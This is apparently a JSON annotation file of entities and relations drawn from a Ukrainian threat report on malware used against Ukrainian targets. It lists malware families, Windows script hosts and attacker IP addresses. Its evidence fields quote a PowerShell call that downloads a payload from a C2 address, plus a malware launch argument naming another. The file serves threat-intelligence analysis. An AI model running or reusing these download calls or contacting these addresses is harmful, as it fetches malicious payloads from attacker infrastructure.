@@ -1,0 +1,135 @@
+{
+  "entities": [
+    {
+      "name": "України",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe whose organizations and media were targeted."
+    },
+    {
+      "name": "LONEPAGE",
+      "kind": "malware family",
+      "gloss": "A PowerShell-based backdoor script that fetches commands and secondary payloads from a C2 server."
+    },
+    {
+      "name": "THUMBCHOP",
+      "kind": "malware family",
+      "gloss": "An information stealer malware targeting data from Chrome and Opera web browsers."
+    },
+    {
+      "name": "CLOGFLAG",
+      "kind": "malware family",
+      "gloss": "A keylogger malware family used to record keystrokes on compromised systems."
+    },
+    {
+      "name": "SEAGLOW",
+      "kind": "malware family",
+      "gloss": "A malware family developed in the Go programming language."
+    },
+    {
+      "name": "OVERJAM",
+      "kind": "malware family",
+      "gloss": "A Go-based reverse proxy malware used for network pivoting and persistence."
+    },
+    {
+      "name": "TOR",
+      "kind": "software product",
+      "gloss": "An open-source anonymity network tool deployed by attackers to create hidden services."
+    },
+    {
+      "name": "SSH",
+      "kind": "software product",
+      "gloss": "A cryptographic network protocol tool used to build reverse remote access connections."
+    },
+    {
+      "name": "wscript.exe",
+      "kind": "software component",
+      "gloss": "A built-in Windows Script Host executable that provides scripting environment support."
+    },
+    {
+      "name": "cscript.exe",
+      "kind": "software component",
+      "gloss": "A command-line version of the Windows Script Host."
+    },
+    {
+      "name": "powershell.exe",
+      "kind": "software component",
+      "gloss": "The command-line shell and scripting framework for Microsoft Windows."
+    },
+    {
+      "name": "mshta.exe",
+      "kind": "software component",
+      "gloss": "A Windows utility responsible for executing Microsoft HTML Application (HTA) files."
+    },
+    {
+      "name": "Chrome",
+      "kind": "software product",
+      "gloss": "A web browser developed by Google targeted for credential theft."
+    },
+    {
+      "name": "Opera",
+      "kind": "software product",
+      "gloss": "A multi-platform web browser targeted by info-stealing malware."
+    },
+    {
+      "name": "156.38.245.115",
+      "kind": "ip address",
+      "gloss": "An IP address used as command-and-control infrastructure."
+    },
+    {
+      "name": "179.48.251.182",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat actor infrastructure."
+    },
+    {
+      "name": "217.12.218.107",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious scripts and command-and-control endpoints."
+    },
+    {
+      "name": "45.148.121.6",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious scripts and tools."
+    },
+    {
+      "name": "62.210.204.94",
+      "kind": "ip address",
+      "gloss": "An IP address used as a network endpoint for malware communication."
+    }
+  ],
+  "relations": [
+    {
+      "head": "THUMBCHOP",
+      "type": "steals-data-from",
+      "tail": "Chrome",
+      "evidence": "THUMBCHOP (стілер для Chrome та Opera)"
+    },
+    {
+      "head": "THUMBCHOP",
+      "type": "steals-data-from",
+      "tail": "Opera",
+      "evidence": "THUMBCHOP (стілер для Chrome та Opera)"
+    },
+    {
+      "head": "LONEPAGE",
+      "type": "communicates-with-ip",
+      "tail": "217.12.218.107",
+      "evidence": "downloaddata('http://217.12.218.107:30139/aMPnGqjRPSQIOZQG/page147/upgrade.txt')"
+    },
+    {
+      "head": "SEAGLOW",
+      "type": "communicates-with-ip",
+      "tail": "62.210.204.94",
+      "evidence": "SearchApp.exe\" -ArgumentList \"-s 62.210.204.94\""
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "steals-data-from",
+      "definition": "The subject malware extracts credentials or other data from the target software application."
+    },
+    {
+      "name": "communicates-with-ip",
+      "definition": "The malware connects to or transfers data to and from the specified IP address."
+    }
+  ]
+}
